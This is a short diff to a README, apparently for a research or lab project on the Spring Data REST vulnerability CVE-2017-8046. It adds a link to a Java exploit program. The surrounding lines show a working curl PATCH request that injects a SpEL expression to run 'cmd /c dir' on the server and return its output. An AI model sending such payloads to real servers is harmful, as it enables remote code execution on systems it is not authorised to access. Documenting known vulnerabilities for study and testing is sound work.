@@ -53,6 +53,8 @@ On Windows, a `cmd /c dir` command, and other similar commands, can be launched 
 curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"cmd \" + T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F)) + \"c dir\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
 ```
 
+A Java program to exploit this vulnerability can be found [here](https://github.com/m3ssap0/spring-break_cve-2017-8046).
+
 ## Authors
 
 * **Antonio Francesco Sardella** - *implementation* - [m3ssap0](https://github.com/m3ssap0)
